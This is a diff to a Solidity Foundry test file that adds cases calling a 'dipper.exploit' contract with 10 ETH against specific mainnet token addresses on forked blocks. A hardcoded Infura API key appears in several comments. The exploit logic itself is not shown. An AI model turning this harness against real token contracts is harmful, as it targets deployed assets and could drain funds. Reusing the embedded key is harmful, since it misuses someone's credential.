@@ -55,5 +55,28 @@ contract DipperTest is Test {
         path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
         path[1] = 0x460372866Fe1448DE1549CebdB0539F4075a2Aa8;
         dipper.exploit{value: 10e18}(100, 0, 0, path);
+
+        // 0x59B5cFa539B614d6664426DB4D0D0734C1BdC307 - ? - M6
+        // anvil -f https://mainnet.infura.io/v3/e4a9193a1f35493786c001c3573f7905 --fork-block-number 20757391
+        // address[] memory path = new address[](2);
+        // path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+        // path[1] = 0x59B5cFa539B614d6664426DB4D0D0734C1BdC307;
+        // dipper.exploit{value: 10e18}(100, 0, 0, path);
+    }
+
+    function testExploitM5() public {
+        // 0x5ead96194400aec7ce56f9674033863a4c25ea63 - ? - M5
+        // anvil -f https://mainnet.infura.io/v3/e4a9193a1f35493786c001c3573f7905 --fork-block-number 20758583
+        // address[] memory path = new address[](2);
+        // path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+        // path[1] = 0x5eAD96194400Aec7CE56F9674033863a4c25EA63;
+        // dipper.exploit{value: 10 * 10 ** 18}(200, 0, 13799999138000000, path);
+
+        // 0x09f23c360eca30efdc5f04ac583b669eb5616b98 - ? - M5
+        // anvil -f https://mainnet.infura.io/v3/e4a9193a1f35493786c001c3573f7905 --fork-block-number 20764328
+        address[] memory path = new address[](2);
+        path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+        path[1] = 0x09f23C360EcA30eFDC5f04Ac583B669Eb5616b98;
+        dipper.exploit{value: 10 * 10 ** 18}(100, 0, 10000000000000000, path);
     }
 }
